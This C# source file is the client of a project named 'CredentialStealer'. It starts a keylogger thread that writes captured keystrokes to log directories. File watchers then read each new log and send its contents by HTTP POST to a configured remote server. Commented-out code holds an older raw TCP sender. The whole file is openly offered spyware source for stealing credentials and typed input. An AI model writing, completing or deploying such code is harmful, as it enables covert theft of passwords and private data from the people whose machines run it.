using CredentialStealer.Entities;
using CredentialStealer.KeyboardRecorder;
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CredentialStealer.Client.Console
{
    public class Client
    {
        //private const int PORT = 5000;
        //private const string IP = "127.0.0.1";
        //private const string EOF = "<EOF>";
        // private const int RETRY_DELAY = 5000;

        //public static byte[] read(NetworkStream clientStream, Encoding encoder)
        //{
        //    byte[] result = new byte[0];
        //    int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
        //    while (true)
        //    {
        //        byte[] message = new byte[4096];
        //        int bytesRead = 0;
        //        try
        //        {
        //            bytesRead = clientStream.Read(message, 0, 4096);
        //        }
        //        catch (Exception exception)
        //        {
        //            System.Console.WriteLine(exception);
        //            break;
        //        }
        //        if (bytesRead == 0)
        //        {
        //            return result;
        //        }
        //        Array.Resize<byte>(ref result, result.Length + bytesRead);
        //        Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
        //        if (encoder.GetString(result).EndsWith(EOF))
        //        {
        //            break;
        //        }
        //    }
        //    int eofLength = encoder.GetBytes(EOF).Length;
        //    byte[] truncatedResult = new byte[result.Length - eofLength];
        //    Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
        //    return truncatedResult;
        //}

        //public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer)
        //{
        //    byte[] plainBuffer = Utils.Utils.ConcatenateBytes(buffer, encoder.GetBytes(EOF));
        //    clientStream.Write(plainBuffer, 0, plainBuffer.Length);
        //    clientStream.Flush();
        //}

        //public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
        //{
        //        TcpClient client = new TcpClient();
        //        client.Connect(serverEndPoint);
        //        NetworkStream nwStream = client.GetStream();
        //        ASCIIEncoding encoder = new ASCIIEncoding();


        //        string textToSend = "echo";
        //        byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);

        //        //---send the text---
        //        System.Console.WriteLine("Sending : " + textToSend);
        //        //nwStream.Write(bytesToSend, 0, bytesToSend.Length);

        //        Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
        //        System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
        //        client.Close(); 
        //}

        public static string SendInfosToServer(string content)
        {
            //IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
            string result = null;
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(System.Configuration.ConfigurationManager.AppSettings["ServerEndPoint"]);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            Guid gui = new Guid();
            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                var userData = new CredentialData();
                userData.uid = gui.ToString();
                userData.other = content;
                string json = JsonConvert.SerializeObject(userData);

                streamWriter.Write(json);
                streamWriter.Flush();
                streamWriter.Close();

                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    result = streamReader.ReadToEnd();
                }
            }
            return result;
        }


        private static void OnChangedToAnalyse(object source, FileSystemEventArgs e)
        {
            // Specify what is done when a file is changed, created, or deleted.
            System.Console.WriteLine("Found sniff file to analyse: " + e.FullPath + " " + e.ChangeType);
            ExecutePythonScripts(e.FullPath);
        }

        private static void OnChangedToSend(object source, FileSystemEventArgs e)
        {
            // Specify what is done when a file is changed, created, or deleted.
            System.Console.WriteLine("Found sniff file to send: " + e.FullPath + " " + e.ChangeType);
            string content = File.ReadAllText(e.FullPath);
            SendInfosToServer(content);
        }

        private static void ExecutePythonScripts(string inputFileName)
        {
            string outputFileName = Path.Combine(System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"], Path.GetFileName(inputFileName));
            // Use ProcessStartInfo class
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = false;
            startInfo.UseShellExecute = false;
            startInfo.FileName = inputFileName;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.Arguments = String.Format("{0} {1}", inputFileName, outputFileName);

            try
            {
                System.Console.WriteLine("Execute Python");
                // Start the process with the info we specified.
                // Call WaitForExit and then the using statement will close.
                //using (Process exeProcess = Process.Start(startInfo))
                {
                    //exeProcess.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        public Client()
        {
            try
            {
                //Listen D1 files and execute python scripts
                FileSystemWatcher watcher = new FileSystemWatcher();
                watcher.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"];
                watcher.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.DirectoryName;
                watcher.Filter = "*.*";
                watcher.Created += new FileSystemEventHandler(OnChangedToAnalyse);
                watcher.EnableRaisingEvents = true;

                FileSystemWatcher watcher2 = new FileSystemWatcher();
                watcher2.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"];
                watcher2.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.DirectoryName;
                watcher2.Filter = "*.*";
                watcher2.Created += new FileSystemEventHandler(OnChangedToSend);
                watcher2.EnableRaisingEvents = true;

                while (System.Console.Read() != 'q') ;

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static void Main(string[] args)
        {
            Thread keyLogThread = new Thread(new ThreadStart(KeyLogThreadFunction));
            keyLogThread.Start();
            Thread.Sleep(3000);
            new Client();
        }

        private static void KeyLogThreadFunction()
        {
            try
            {

                string logSniffSrcDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffSrcDir"];
                string logSniffDestDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffDestDir"];
                string logSniffAnalysedDir = System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"];


                if (!System.IO.Directory.Exists(logSniffSrcDir))
                {
                    System.IO.Directory.CreateDirectory(logSniffSrcDir);
                }

                if (!System.IO.Directory.Exists(logSniffDestDir))
                {
                    System.IO.Directory.CreateDirectory(logSniffDestDir);
                }

                if (!System.IO.Directory.Exists(logSniffAnalysedDir))
                {
                    System.IO.Directory.CreateDirectory(logSniffAnalysedDir);
                }
                KeyLogger kl = new KeyLogger("keylogging", logSniffSrcDir, logSniffDestDir);
                while (true)
                {
                    Application.DoEvents();
                }
            }
            catch (Exception e)
            {
                System.Console.WriteLine("Error in KeyLogger Process \n" + e);
            }
        }
    }
}
